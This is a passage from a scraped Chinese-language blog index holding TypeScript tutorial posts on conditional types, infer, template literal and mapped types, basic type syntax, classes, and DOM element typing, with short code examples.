Collection 的集合所以不會被留下。如果這段有理解的話應該就能看懂 T2 和 T3，因為都是相同的概念。 可是你仔細想想後會發現一道瑕疵，「為什麼前面明明說符合條件時就回傳 T 的型別（a | b | c），但最後回傳的卻只有 a | b？說好的 c 呢？」 這是因為當泛型傳入的型別為 union type 時，會出現類似分配律的行為。如果忘記什麼是分配律的話，這裡幫你複習一下： 1a * (b + c) = (a * b) + (a * c) 所以拿 T1 的例子來示範的話，其實可以拆成這樣子： 12// 'a' | 'b'type T1Distribute = Extract&lt;'a', Collection&gt; | Extract&lt;'b', Collection&gt; T2 的話則是： 123456// | 'a' | 'b' | never | nevertype T2 = | Extract&lt;'a', Collection&gt; | Extract&lt;'b', Collection&gt; | Extract&lt;'c', Collection&gt; | Extract&lt;'d', Collection&gt; 註：任何跟 never 交集的結果都還是它自己 所以這就是為什麼可以只回傳部分的 T，因為有分配律的概念在後面。 不想要分配律的行為如果不想要 TS 使用分配律的行為來進行判斷的話，可以加上 [] 來改寫： 123456789type ExtractNoDistribute&lt;T, U&gt; = [T] extends [U] ? T : never// 'a' | 'b'type T1 = ExtractNoDistribute&lt;'a' | 'b', Collection&gt;// nevertype T2 = ExtractNoDistribute&lt;'a' | 'b' | 'c', Collection&gt;// 'a'type T3 = ExtractNoDistribute&lt;'a', Collection&gt;// 'b'type T4 = ExtractNoDistribute&lt;'b', Collection&gt; 現在只有當 T 全部都符合條件時才會回傳整個 T，否則一率回傳 never。 InferInfer 是一個讓 TS 自動推導型別的關鍵字。這邊會拿前面介紹過的 Flatten 來示範如何使用： 原本在 Flatten 對 T 的限制是「符合任何型別的陣列」，但現在可以利用 infer 來自動推導出該陣列的型別為何： 如果你對於這邊的 (infer R)[] 有點疑惑的話，可以回憶一下你在幫陣列定義 type 的時候都是怎麼寫的，通常會是這樣子： 1234string[]number[]boolean[]... 而現在我們希望把 [] 前面的 string、number 交給 TS 去自動判斷，所以才會用 (infer R) 的方式來告訴 TS：「我要你幫我自動推導出 R 的型別」。 接著我們在用的時後就會是這樣： 12345678// 此時的 R 等於 'PeaNu' | 'PPB' | 'Andy'type FlattenPersons = Flatten&lt;['PeaNu', 'PPB', 'Andy']&gt;// 此時的 R 等於 numbertype FlattenNumbers = Flatten&lt;number[]&gt;// 此時的 R 等於 stringtype FlattenStrings = Flatten&lt;string[]&gt; 以這個例子來說傳入的型別都有符合「陣列子集合」的條件，所以最回傳的就會是 R 的型別。 12345678type Persons = ['PeaNu', 'PPB', 'Andy']// 'PeaNu' | 'PPB' | 'Andy'type FlattenPersons = Flatten&lt;Persons&gt;// numbertype FlattenNumbers = Flatten&lt;number[]&gt;// stringtype FlattenStrings = Flatten&lt;string[]&gt; 另一個範例剛剛的範例可能看不太出來 infer 的用途，所以這邊再舉一個例子： 關於這個內容我會這樣子來解釋：「T 必須是 {response: ..., status: number} 的子集合，若符合的話就回傳 ...，反之則回傳 any」。 而 ... 的部分我們用了 infer R，也就是請 TS 自動推導出 R 的型別，例如說： 12type RespType1 = InferResponse&lt;{ response: { data: 'PeaNu' }; status: 200 }&gt; // { data: 'PeaNu' }type RespType2 = InferResponse&lt;{ status: 200 }&gt; // any RespType1 的內容因為有符合 extends 的條件，所以會回傳 R 的型別。而 R 的型別會依據 response 中的內容來判斷，應該能看出是 { data: 'PeaNu' }，所以這就會變成最後的結果。 RespType2 的內容因為沒有符合 extends 的條件，所以會直接回傳 any 型別。 使用 infer 的時機與注意事項看了前面兩個範例以後應該能察覺 infer 通常使用在需要條件判斷，但又不確定型別時使用。 此外，還有幾個必須要遵循的條件： infer 只能用在 condition type 中的 extends 和 ? 前的位置使用，不可以在一般的 generic extends 中使用。 infer R 的這個 R 若要當成回傳值時只能在 true 的情況（即 ? 後面），不能在 false 的情況（即 : 後面）下使用。 試著理解 ReturnType 和 Parameters如果前面都有理解的話，這兩個 type 應該就不難理解。 先來看 ReturnType 的原始碼： 因為比較複雜，所以這邊可以拆成兩個部分來看： 1&lt;T extends (...args: any) =&gt; any&gt; 首先傳入的 T 必須符合「function 的子集合，且該 function 可以接收任何參數、任何回傳值」。 1T extends (...args: any) =&gt; infer R ? R : any 接著是條件判斷。若傳入的 T 符合條件（剛剛上面提的），那就把該 function 的回傳值用infer 推導出來後回傳（即 R），反之則回傳 any。 實際使用起來會是這樣： 1234type FuncReturnType1 = ReturnType&lt;(a: number, b: string) =&gt; number&gt; // numbertype FuncParamsType2 = ReturnType&lt;() =&gt; string&gt; // stringtype FuncParamsType4 = ReturnType&lt;string&gt; // anytype FuncParamsType4 = ReturnType&lt;number&gt; // any 接著來看 Parameters 的原始碼： 其實跟剛剛很類似，不過我們一樣拆成兩部分來看： 1T extends (...args: any) =&gt; any 首先傳入的 T 必須符合「function 的子集合，且該 function 可以接收任何參數、任何回傳值」，到目前為止都跟剛剛一樣。 1T extends (...args: infer P) =&gt; any ? P : never 接著就有點不同了。若傳入的 T 符合條件（剛剛上面提的），那就把該 function 的「參數值」用infer 推導出來後回傳（即 P），反之則回傳 never。 所以跟剛剛的差別只在於 infer 的對象不同，一個 infer 參數，一個 infer 回傳值；以及當條件不符合時回傳 never。 實際使用起來會是這樣： 12345type FunctionParamsType1 = Parameters&lt;(a: number, b: string) =&gt; number&gt; // [a: number, b: string]type FunctionParamsType2 = Parameters&lt;(a: number) =&gt; number&gt; // [a: number]type FunctionParamsType3 = Parameters&lt;() =&gt; number&gt; // []type FunctionParamsType4 = Parameters&lt;string&gt; // nevertype FunctionParamsType5 = Parameters&lt;number&gt; // never Template Literal Types好像沒有什麼是 TS 做不到的，就連 JS 的「Template Literal」也是。直接來看範例： 就真的跟你在寫 JS 的用法幾乎一樣，不要懷疑。不過除了用來定義型別以外，在 TS 中它還有一些蠻方便的用途，下面來介紹一下。 當 Template Literal Types 碰到 Union 時當我們在 ${} 中放入的型別是一個 union 時，它會再產生另外一組新的 union，來看範例： 所以來考考你，底下的範例會輸出什麼： 123type X = 'left' | 'right'type Y = 'top' | 'bottom'type Position = `${X}-${Y}` // ? 答案： 1;'left-top' | 'left-bottom' | 'right-top' | 'right-bottom' 把 Enum 的 values 變成 Union Type如果你有一個 Enum 長這樣： 當你想把這些「值」變成一個 type 時，你可能會額外寫一個 Type Alias 來處理： 1type ManufactureValues = 'apple' | 'samsung' | 'google' | 'sony' 這樣子的缺點是如果未來要新增 MANUFACTURE 的內容時，就得同步更新 ManufactureValues 的內容，其實還蠻麻煩的。 因此可以利用 Template Literal Types 來改寫成這樣： 1type ManufactureValues = `${MANUFACTURE}` // \"apple\" | \"samsung\" | \"google\" | \"sony\" 只要把 MANUFACTURE 放入 ${} 以後就會自動產生對應的 union 出來，非常非常好用！ Recursive type建立 Type Alias 的方式有很多種，但沒想到連「遞迴」也是有可能的！？讓我們來看個範例： 1234type ValueOrArray&lt;T&gt; = T | T[]type NumberOrNumbers = ValueOrArray&lt;number&gt;let something: NumberOrNumbers = [1, 2, 3]something = 100 這裡先建立了一個 ValueOrArray，用途是讓我們可以建立一個「純值」或「陣列值」的變數，所以 something 可以是 number 或 number[]。 可是當出現巢狀陣列時會有問題： 其實也沒什麼奇怪的，因為我們只有說型別是 number[] 或 number，並沒有定義 number[][]。 所以這裡可以用遞迴的方式來處理： 123456type ValueOrNestedArray&lt;T&gt; = T | ValueOrNestedArray&lt;T&gt;[]type NumberOrNestedNumbers = ValueOrNestedArray&lt;number&gt;let something: NumberOrNestedNumbers = [1, 2, 3]something = 100// 想巢狀幾層都沒問題something = [1, 2, [3, [4]]] 這邊的 ValueOrNestedArray 的值是 T | ValueOrNestedArray&lt;T&gt;[]。要注意的地方是它在裡面又呼叫了自己，所以就會有點類似這樣的感覺： 1T | T[] | T[][] | T[][][] | ... 所以用這種方式改寫後就能處理巢狀陣列的問題。 範例－SnakeToCamelCase這是另一個遞迴的應用範例，原始碼如下： 雖然剛開始看我也覺得有點複雜，不過拆成一塊一塊來解讀就會比較好理解了。我們先來看第一個部分： 1type SnakeToCamelCase&lt;T extends string&gt; 這段的意思是「傳入的 T 必須是 string 的子集合」。 1T extends `${infer Head}_${infer Tail}` ? ... : T 這邊是一個條件判斷，「當 T 屬於 xxx_ooo 字串的子集合」時符合條件，不符合的話就回傳 T。 此外，這邊還搭配了 infer 來推導出字串的 literal string type。舉例來說，如果傳入的 T 為 hello_my_world，那 infer 出來的結果就會是 hello 與 my_world（前者為 Head，後者為 Tail）。 1;`${Uncapitalize&lt;Head&gt;}${Capitalize&lt;SnakeToCamelCase&lt;Tail&gt;&gt;}` 這邊使用了兩個內建的 Utility Types： Uncapitalize 顧名思義，把第一個字轉成小寫。 Capitalize 顧名思義，把第一個字轉成大寫。 舉個範例： 12type CapitalizeWord1 = Uncapitalize&lt;'Hello'&gt; // 'hello'type CapitalizeWord2 = Capitalize&lt;'world'&gt; // 'World' 理解後讓我們繼續回到剛剛的段落，現在假設 &lt;Head&gt; 與 &lt;Tail&gt; 的值為 hello 與 my_world 的話，出來的結果會是這樣： 1${'hello'}${Capitalize&lt;SnakeToCamelCase&lt;'My_world'&gt;&gt;} 這邊如果跟我一樣對遞迴苦手的話，可以先拿掉 SnakeToCamelCase 這一段： 1${'hello'}${Capitalize&lt;'My_world'&gt;} 這樣子最後的結果就會是 helloMy_world，應該不難理解： 可以看到如果沒有遞迴的話，就只會對第一段的 xxx_ooo 做轉換，後面的部分沒有處理完全。所以這個時候我們要做的事情很簡單，就是把剛剛的事情再做一次，反覆的重複這段動作，直到不會再出現 xxx_ooo 的格式為止，這個就是遞迴的用意。 這邊附上遞迴中的每個步驟的流程，希望有助於理解： 1234567891011121314151617181. hello_my_world // 第一次執行 SnakeToCamelCase&lt;'hello_my_world'&gt;${Head} -&gt; 'hello', ${Tail} -&gt; 'my_world'${'hello'}${Capitalize( S( 'my_world' ) )}2. my_world // 第二次執行 SnakeToCamelCase&lt;'my_world'&gt;${Head} -&gt; 'my', ${Tail} -&gt; 'world'${'my'}${Capitalize( S( 'world' ) )}3. world // 第三次執行 SnakeToCamelCase&lt;'world'&gt;到這裡時因為沒有符合 xxx_ooo 子集合的條件，所以直接回傳 T（也就是 world）4. 跳回步驟二${'my'}${Capitalize( 'world' )} -&gt; ${'my'}${'World'}5. 跳回步驟一${'hello'}${Capitalize( 'myWorld' )} -&gt; ${'hello'}${'MyWorld'}結束並回傳 `helloMyWorld` 型別 我覺得遞迴之所以難懂，是在於它的執行順序跟你想的不太一樣。以上面的例子來說，雖然 SnakeToCamelCase&lt;'hello_my_world'&gt; 是第一個被執行的，但他實際跑完的時間點卻要等到後面的 SnakeToCamelCase&lt;'my_world'&gt;、 SnakeToCamelCase&lt;'world'&gt; 跑完並把值回傳以後，才會執行回過頭來下一行的 ${'hello'}${Capitalize( 'myWorld' )}。 所以碰到遞迴的時候要常常用反向的方式去思考，要用「排在後面那個 function 的回傳值應該是什麼？」下去思考，我覺得這樣就會好理解一點了。 typeof如果你寫 TS 已經有一段時間了，應該會知道 TS 有一個自動推導的功能，就是即便我們沒有幫變數指定型別，它也能自動推導出來： 這樣的好處是什麼？好處是只要用 TS 中的 typeof（不是 JS 的那個）就能產生出新一個型別，像這樣： 注意這裡是直接檢查一個變數的型別（bio），再把這個型別賦給 BioType，跟以往的做法不太一樣。 既然可以用 typeof 來取出型別，那這樣子玩也是 ok 的： 12345678910const bio = { name: 'PeaNu', age: 24, occupation: 'Frontend', level: 'Senior'}type BioType = typeof bio // { name: string, .... }type BioKeys = keyof typeof bio // \"name\" | \"age\" | \"occupation\" | \"level\"type BioValues = BioType[keyof typeof bio] // string | number 利用 typeof 取出 Enum 的 Key上次有介紹過如何用 Template Literal Types 來取出 Enum 的值： 1type ManufactureValues = `${MANUFACTURE}` // \"APPLE\" | \"SAMSUNG\" | \"GOOGLE\" | \"SONY\" 這次來介紹如何用 typeof 來取出 Enum 的 keys： 1type ManufactureKeys = keyof typeof MANUFACTURE // \"APPLE\" | \"SAMSUNG\" | \"GOOGLE\" | \"SONY\" 這兩招學起來後對 Enum 會非常有幫助！ Index Signatures &amp; Mapped Type一般在幫物件建立型別時會這樣子做： 12345type Person = { firstName: string lastName: string age: number} 但如果哪天你碰到「有太多屬性」的問題時，你可能不會想像上面這樣子把每一個屬性都列出來，這時候就可以改寫成這樣： 123type Person = { [key: string]: string | number} 這種寫法叫做「Index Signatures」。我們沒有直接指定屬性名稱，而是用一個 key 來當作變數，並把這個 key 的型別設為 string。 key 只是一個變數，你想取什麼名字都 ok。而型別的部分可以指定的值有 string | number | symbol。當然，這邊 Person 的屬性很顯然是一個字串，所以 string 自然是最符合的型別。 在理解完 Index Signatures 以後，接著就可以來介紹「Mapped Type」。 Mapped Type 的用法跟前面很類似，只差在它會多用到一個 in 關鍵字，來看一個範例： 123type Person = { [key in 'firstName' | 'lastName']: string} 註：這裡的 key 一樣只是個變數，想取啥就取啥。 如果你熟 ES6 的話應該會覺得這跟 for...in 和 for...of 的寫法很類似。確實，這兩者背後的共通點就是「iterable」的概念。 以上面的例子來說，其實只是去迭代 firstName 和 lastName 這兩個值，並產生出像這樣的東西： 1234type Person = { firstName: string lastName: string} 這個例子看起來有點脫褲子放屁的感覺，不過如果用對地方的話會發現這是一個很厲害的功能，讓我們再看一個例子。 假設目前有個 type 長這樣： 123456type Events = { click: string change: string keyup: string keydown: string} 如果我想要再多一個一樣的型別，只是 string 的部分改成 function，像這樣： 123456type EventHandlers = { click: () =&gt; void change: () =&gt; void keyup: () =&gt; void keydown: () =&gt; void} 你可以想想看怎麼利用 Mapped Type 來改寫嗎？不然這樣子寫會有一個問題，就是當 A 改變時也得一併修改 B，才能確保兩邊的內容是一致的。 答案是： 123type HandleEvents = { [K in keyof Events]: () =&gt; void} 產出的內容： 很神奇吧！但其實只是利用前面提過的概念而已，先用 keyof 把 Events 的屬性取出來，再利用 Mapped Type 來迭代出新的型別。 搭配 Template Literal 修改 key 的值剛剛已經介紹過怎麼利用 Mapped Type 來修改物件型別的值的 type，這邊再教你一招新的：「如何修改 key 的值」。 這邊會拿剛剛的範例來用： 123456type HandleEvents = { click: () =&gt; void change: () =&gt; void keyup: () =&gt; void keydown: () =&gt; void} 這邊想做的事情是，把 key 的部分改成： 123456type EventHandlers = { handlerClick: () =&gt; void handlerChange: () =&gt; void handlerKeyup: () =&gt; void handlerKeydown: () =&gt; void} 如果要達成這樣的效果，可以建立一個 utility type 來達成： 首先來看 K in key of T &amp; string 這一段。因為我們要對傳入的型別（即 T）的 key 做修改，所以必須先把原本的 key 透過 keyof 取出。 另外 T &amp; string 後面 &amp; string 的用途在前面有提過，一個 key 的型別可以是 string | number | symbol，所以要用 &amp; string 來讓 TS 知道這邊的 key 是 string，否則後面在使用時會有一些衝突。 順利取出 key 以後就可以搭配 in 來迭代每一個 key。 接著看到 as ... 的部分。as 的作用是「斷言」，例如說： 1const something = '123' as number 這裡的 '123' 照理說會是 string，但是當我們在後面加上 as number 以後，something 就會被強制變成 number 的型別： 我知道這個例子看起來有點詭異，但重點是要強調 as 可以把原本的型別修改成另一個型別。 所以 K in key of T &amp; string 後面的 as 就是在「把前面的 K 修改成 ??? 型別」。這裡想做的修改是把原本的 K 加上前綴字 handler，所以搭配了 Template Literal 來做處理（即 handler${Capitalize&lt;K&gt;}），透過這種方式產出的型別就會是 handler(xxx)（xxx 就是 K 原本的字串內容）。 除了加上 handler 前綴以外，這邊還用了 Capitalize 把 K 的字首變成大寫，藉此讓產出的文字符合 JS 的命名慣例（駝峰式）。 理解完每一步的邏輯後，現在可以利用它來達到我們想要的結果了： 1234type ToEventHandler&lt;T&gt; = { [K in keyof T &amp; string as `handler${Capitalize&lt;K&gt;}`]: T[K]}type EventHandler = ToEventHandler&lt;HandleEvents&gt; Property modifiers雖然你可能不知道什麼是「Property modifiers」，但你其實早就在用它了： 12345type Person = { firstName: string readonly lastName: string age?: number} ? 跟 readonly 這兩個符號都是 Property modifiers。如其名，就是 property 的修飾符號。以這個例子來說的話： age 屬性是 optional 的，沒有也沒關係 lastName 的屬性值只能讀，不可以改寫它的值 搭配 Mapped Type 來使用如果現在我們有兩個 Type 是： 1234567891011type OptionalPerson = { firstName?: string lastName?: string age?: number}type NonOptionalPerson = { firstName: string lastName: string age: number} 現在如果要讓 OptionalPerson 的所有屬性變成 Optional，可以這樣寫： 1234type ToOptional&lt;T&gt; = { // ? 前面的 + 可以省略（預設值） [K in keyof T]+?: string} 或者是把 NonOptionalPerson 的所有屬性變成 Required 的話： 1234type ToRequired&lt;T&gt; = { // - 不可以省略 [K in keyof T]-?: string} 又或者是設為 readonly 或 non-readonly 的話也可以這樣做： 123456type ToNonReadOnly&lt;T&gt; = { -readonly [K in keyof T]: string}type ToReadOnly&lt;T&gt; = { +readonly [K in keyof T]: string} 最後來做個測試。 如果現在把 OptionalPerson 丟給 ToRequired，所有屬性就會變成 Required： Partial、Required 和 Readonly剛剛利用 property modifier 建立的三種 Type，其實就是 TS 內建提供的 Partial、Required 和 Readonly。這邊分別來看一下它們原始碼： 123type Partial&lt;T&gt; = { [P in keyof T]?: T[P]} 123type Required&lt;T&gt; = { [P in keyof T]-?: T[P]} 123type Readonly&lt;T&gt; = { readonly [P in keyof T]-?: T[P]} 泛型參數預設值 如果你有用過 JS 中的參數預設值的話，要理解 TS 中的泛型參數預設值應該就不困難。 我們一般在 JS 中使用參數預設值的時候通常是這樣： 123456// 如果 arr 沒有傳，將預設值設為空陣列function getLength(arr = []) { return arr.length}getLength() // 0 要在 TS 中做一樣的事情也是 OK 的，讓我們回到一開始的例子： 1type PickWithDefaultValue&lt;T, K extends keyof T = keyof T&gt; = Pick&lt;T, K&gt; 這裡的 PickWithDefaultValue 跟原本的 Pick 功能是一樣的，會接收兩個參數，第一個參數是原本的物件型別，第二個參數是要取出的屬性。 兩個的差別只在於第二個參數是不是一定要傳入？以原本 Pick 來說，如果你沒有傳入第二個參數的話會 TS 會報錯： 但如果是用 PickWithDefaultValue 的話，因為有預設值的關係，所以就算不傳入第二個參數也沒關係： 這是怎麼做到的？只是因為我們幫他加上了預設值而已： 12// 如果 K 沒有值，就設為 T 的所有 keytype PickWithDefaultValue&lt;T, K extends keyof T = keyof T&gt; = Pick&lt;T, K&gt; 參考資料React 前端工程師的兩把刷子","link":"/2023/01/01/typescript-advanced/"},{"title":"TypeScript 基礎","text":"真的頗基礎的 QQ 前備知識 TS 只是一個工具，用來讓 JS 可以有強型別的驗證 我們只是先用 TS 的方式來寫，接著再編譯器來 Complie 成 JS 相關指令 tsc index.js 編譯某個檔案 tsc 根據 config 來做編譯 tsc --watch 有變動就重新編譯 最基本範例123// index.tslet aaa: string = '123'console.log(aaa) 編譯後： 12var aaa = '123'console.log(aaa) 另外我也有看過這種寫法： 1let aaa = 123 as number; 這樣的意思應該跟上面是差不多的，就看你喜歡哪種吧！ 設定 config先在專案底下執行： 1tsc --init 專案就會多出一個 tsconfig.json，裡面就可以去調整設定（跟 VS Code 差不多） 這邊來設定最基本的兩個東西： 入口資料夾 出口資料夾 12345// tsconfig.json{ \"rootDir\": \"./src\", \"outDir\": \"./dist\"} 接著只要執行 tsc 就會自動根據 config 來做編譯了。 另外要開啟 source map 的話可以把 sourceMap 設為 true。 型別介紹基本12345678910111213let str: string = '123'// 通常這種沒值的才會建議寫上 typelet str1: stringstr1 = 'PeaNu'let num: number = 123let bool: boolean = truelet n: null = nulllet un: undefined = undefined// 如名，可以是任何 type// 但一般只會用在必要的地方let anyType: any = 123 陣列12345678910// 決定陣列中的值的 typelet arr1: string[] = ['a', '123']// 二維裡的 typelet arr2: string[][] = [['a'], ['b']]// 元祖（Tuple）// 按照「順序」決定每一個 typelet tuple1: [number, string, boolean] = [123, 'abc', true]// 二維元祖裡的 typelet tuple2: [string, string][] = [['abc', 'def']] Enum有點像代號的感覺，但改用文字來表示： 1234567enum LiveStatue { SUCCESS = 0, FAIL = -1, STREAMING = 1}const liveStatus = LiveStatue.SUCCESS Union一個變數可以設定多個 type： 1234// 可以是 number 或 stringlet union: number | stringunion = 123union = 'abc' type把 union 改用 type 來儲存（跟變數有點像） 1234567891011121314151617181920type A = number | stringtype B = boolean | stringlet useTypeA: AuseTypeA = 123useTypeA = 'abc'let useTypeB: BuseTypeB = trueuseTypeB = 'yoyoyo'type Card = { name: string des: string}const user: Card = { name: 'PeaNu', des: '...'} interface應該是用在 Object： 1234567891011interface Card2 { name: string des: string age: number}const user: Card2 = { name: 'PeaNu', des: '...', age: 20} 也可以用 ? 來變成「可選」的： 1234567891011interface Card2 { name: string; des: string; age?: number;}// 沒有 age 也沒關係const user: Card2 = { name: 'PeaNu', des: '...'} type 跟 interface 的區別一個可以「擴充」，一個不行。 1234567891011121314151617type Card1 = { name: string des: string}// type 不可以在往下加type Card1 = { age: number}interface Card2 { name: string des: string}// interface 可以interface Card2 { age?: number} Functionfunction 主要是用來處理參數和回傳值的部分： 12345678910// 回傳值的 typefunction stringConcat(a: string, b: string): string { return a + b}// undefined 的處理（加上問號）// undefined 的類型只能寫在最後面，畢竟參數要按照順序傳function saySomething(age: string, name?: string) { return age + name} 斷言（unknown）第一個會用到的情境是 call API 的時候。 因為 TypeScript 沒辦法知道 response 長怎樣，所以什麼都沒加的話就會是 any。 12345678910111213type Data = { userId: number id: number title: string completed: boolean}async function getData() { const res = await fetch('https://jsonplaceholder.typicode.com/todos/1') // 如果沒有 as Data，就會被當作 any const data = (await res.json()) as Data console.log(data)} 所以上面的例子就透過 as Data 來做斷言，告訴它回傳值會長得像 Data 這個模樣。 第二種用法是可能某個值被 TypeScript 自動判斷，但這結果可能不太準確，就能用 as unknown as xxx 的手法來做： 1234567891011121314151617181920212223242526type Data = { userId: number id: number title: string completed: boolean}// as unknown 後再重新斷言// 先把 data1 設為 Data 這個 type// 接著把值賦予給 data2，它就會自動被判定為 Data 這個 type// 但如果 data1 的值不固定的話就會有一些誤差問題const data1: Data = { userId: 1, id: 1, title: 'delectus aut autem', completed: false}// data2: Dataconst data2 = data1type Data2 = { name: string}// data2: Data2const data2 = data1 as unknown as Data2 Class 的應用一般在 class 裡可以宣告 private、publice、protected 等等之類的關鍵字，but 我們都知道 JS 本身並沒有實際支援這些功能，你還是可以在外面直接去存取 private 的成員。 而 TS 解決了這個問題，如果你在 TS 去存取私有成員，就會編譯失敗。 提醒：private 跟 protected 的差別在於，透過繼承的 class 沒辦法存取到 private，但 protected 可以。 12345678910111213class Live { public name: string private id: number protected user: string constructor(nameParam: string, idParam: number, userParam: string) { this.name = nameParam this.id = idParam this.user = userParam }}const live = new Live(\"PeaNu's live\", 12345, 'PeaNu')console.log(live) 這樣的結果會是： 123456// 還是存取的到 private 跟 protected{ \"name\": \"PeaNu's live\", \"id\": 12345, \"user\": \"PeaNu\"} 但如果你在 TS 這樣寫的話就會錯誤： 至於 protected 的部分也一樣，TS 一樣會去判斷繼承的 class 可以存取到哪些成員： 12345678910class SpecailLive extends Live { constructor(nameParam: string, idParam: number, userParam: string) { super(nameParam, idParam, userParam) } start() { super.name super.user super.id // 不可以存取到 private 的值 }} 如果不依賴 TS 的話，JS 原生的作法是這樣： 123456789101112// 原生的 private 方法（比較新）class Live2 { #name constructor(name: string) { this.#name = name }}// 背後是用 weakMap 去實作的const testLive = new Live2('Test Live')// {}console.log(testLive) implementclass 如果想把某個 interface 實作出來，可以用 implement 這個關鍵字，像這樣： 12345678910111213interface CarProps { name: string age: number}class Car implements CarProps { name: string age: number constructor(name: string, age: number) { this.name = name this.age = age }} 不過要注意，interface 中的成員一定是 public，不可以在 class 中寫成 private： 泛型簡單來說就是「call function 的時候才決定 type 是什麼」，直接看範例： 1234567// 如果要多個的話可以寫成 print&lt;A, B, C&gt;function print&lt;T&gt;(data: T) { console.log(data)}print&lt;number&gt;(999)print&lt;string&gt;('Hello')print&lt;boolean&gt;(123) // 錯誤，沒有傳正確的 type 另外也能用在 class 上（constructor）： 123456789class Print&lt;T&gt; { data: T constructor(d: T) { this.data = d }}const p = new Print&lt;number&gt;(123)const p1 = new Print&lt;string&gt;('Hello') &amp; 與 |其實他們就跟 &amp;&amp; 和 || 的意思是ㄧ樣的（應該是為了方便區分吧！），直接來看 code 就明白了： 12345678910111213141516171819interface OP1 { a: number}interface OP2 { b: number}// 指定 type 為 OP1 且 OP2// 只要漏掉一個就不正確const op1AndOp2: OP1 &amp; OP2 = { a: 123, b: 456}// 指定 type 為 OP1 或 OP2// 可以擇一就好const op1OrOp2: OP1 | OP2 = { a: 123} TS 內部提供的 utilityRecord第一個是 Record，其中一個例子是決定 Object 的 key 跟 value： 1234567891011121314151617// 決定物件的 valueinterface CatInfo { age: number breed: string}// 決定物件的 keytype CatName = 'miffy' | 'boris' | 'mordred'// 一個物件包物件的結構const cats: Record&lt;CatName, CatInfo&gt; = { miffy: { age: 10, breed: 'Persian' }, boris: { age: 5, breed: 'Maine Coon' }, mordred: { age: 16, breed: 'British Shorthair' }, // 不存在的 key 會報錯 peanu: { age: 22, breed: '...' }} Pick第二個是 Pick，可以從 interface 抽一部分的內容來用： 1234567891011121314interface Todo { title: string description: string completed: boolean}type TodoPreview = Pick&lt;Todo, 'title' | 'completed'&gt;const todo: TodoPreview = { title: 'Clean room', completed: false, // 沒有 pick 出來的東西就不能用 description: 'yoyoyo'} Omit第三個是 Omit，就是 Pick 顛倒過來而已，Pick 是把要的拿出來，Omit 是把不要的東西拿掉，其他留下。 12345678910111213141516interface Todo { title: string description: string completed: boolean createdAt: number}type TodoPreview = Omit&lt;Todo, 'description'&gt;const todo: TodoPreview = { title: 'Clean room', completed: false, createdAt: 20210511, // 已經 Omit 掉的東西就不該出現 description: '...'} Partial有時候你可能定義了這樣的型別： 123456789interface Blog { id: string title: string slug: string categories: string[] tags: string[] featureImageUrl?: string content: string} 但你沒辦法確保每一次使用時都能填入每一個值，這時候就可以用 Partial&lt;T&gt; 的方式把所有選項變成「Optional」，避免 TypeScript 的編譯錯誤： 123const post: Partial&lt;Blog&gt; = { title: 'Partial so good'} 你並沒有直接改變 Blog 的型別，而是在「使用時」來讓他變成可選的，我覺得這是很划算的功能。 React基本範例這邊主要介紹幾個東西： Functional Component 的 type Props 的 type hook 的 type 12345678910111213141516171819202122import React, { useState } from 'react'import './App.css'// 我希望傳進來的 props 的 typestype TitleProps = { name: string | number desc?: string}// 只要是 Function Component 基本上都會這樣寫（React.FC）const Title: React.FC&lt;TitleProps&gt; = ({ name, desc }) =&gt; { return &lt;h1&gt;Hello, {name}&lt;/h1&gt;}const App: React.FC = () =&gt; { // 當我 useState 可能有多個值的時候才會寫出來 const [title, setTitle] = useState&lt;string | number&gt;('PeaNu') return &lt;Title name={title} /&gt;}export default App Event如果要指定 Event 的 type，可以加上 React 前綴來處理： 1234567891011121314151617181920212223242526272829303132333435function App() { const canvas1 = useRef&lt;HTMLCanvasElement&gt;(null) // 原本是直接 TouchEvent | MouseEvent，但在 React 要加上前綴 function onStart(event: React.TouchEvent | React.MouseEvent) { const cavasSize = canvas1.current?.getBoundingClientRect()! let position = { x: 0, y: 0 } if (event.type === 'mousemove') { position.x = (event as React.MouseEvent).clientX - cavasSize.left position.y = (event as React.MouseEvent).clientY - cavasSize.right } else { position.x = (event as React.TouchEvent).changedTouches[0].clientX - cavasSize.left position.y = (event as React.TouchEvent).changedTouches[0].clientY - cavasSize.right } return position } return ( &lt;div className='App'&gt; &lt;canvas ref={canvas1} id='canvas' width='500' height='300' onMouseDown={onStart} onTouchStart={onStart} &gt;&lt;/canvas&gt; &lt;/div&gt; )}","link":"/2022/05/10/typescript-basic/"},{"title":"TypeScript－複習與一些小技巧","text":"看來要精通它得花更多時間來練習才行。 存取 DOM 元素當我們在操作 DOM 元素時，可能會用一個變數來儲存元素，像這樣： 12const anchor = document.querySelector('a')console.log(anchor.href) 這時候就會顯示錯誤說：「Object is possibly null」，這是因為 TS 預設判斷 type 長這樣： 因為在寫 TS 的時候他不會知道你選到的 DOM 元素是否真的存在，所以他會幫你加上一個 null，代表這有可能是 null。 解決的方法有蠻多的，參考以下幾個： 1234567891011121314151617// 用 ? 可選串連const anchor = document.querySelector('a')console.log(anchor?.href)// 用 as 來斷言const anchor = document.querySelector('a') as HTMLAnchorElementconsole.log(anchor.href)// 用 ! 來保證他絕對不會是 null 或 undefinedconst anchor = document.querySelector('a')!console.log(anchor.href)// 用 if 來確保有值的時候才做這件事const anchor = document.querySelector('a')if (anchor) { console.log(anchor.href)} 透過 selector 來選取 DOM 元素如果元素是透過 selector 來選到的話，TS 只會把他指派為 Element | null 這個 type，所以你可以自行指定： 1234567891011const form = document.querySelector('.new-item-form') as HTMLFormElementconst type = document.querySelector('#type') as HTMLSelectElementconst toFrom = document.querySelector('#tofrom') as HTMLInputElementconst details = document.querySelector('#details') as HTMLInputElementconst amount = document.querySelector('#amount') as HTMLInputElement// event 的 type 是 Eventform.addEventListener('submit', function (e: Event) { e.preventDefault() console.log(type.value, toFrom.value, details.value, amount.valueAsNumber)}) Class 本身可以當成一個 type1234567891011121314151617181920212223class Invoice { client: string details: string amount: number constructor(c: string, d: string, a: number) { this.client = c this.details = d this.amount = a } format() { return `${this.client} has ${this.details} for ${this.amount}` }}const invoiceOne = new Invoice('peanu', 'bicycle', 300)const invoiceTwo = new Invoice('ppb', 'phone', 100)// 把 Invoice 當成陣列的 typeconst invoices: Invoice[] = []// 所以就可以把 instance 放進去invoices.push(invoiceOne, invoiceTwo) Class 的 private、readOnly、public這個寫法在 JS 中其實是沒作用的，但到了 TS 就不一樣了： 1234567891011121314151617181920212223242526class Invoice { private client: string // 只有 class 能 Read &amp; Write readonly details: string // 不管是誰都只能 Read public amount: number // instance 也能 Read &amp; Write constructor(client: string, details: string, amount: number) { this.client = client this.details = details this.amount = amount } format() { return `${this.client} has ${this.details} for ${this.amount}` }}const invoiceOne = new 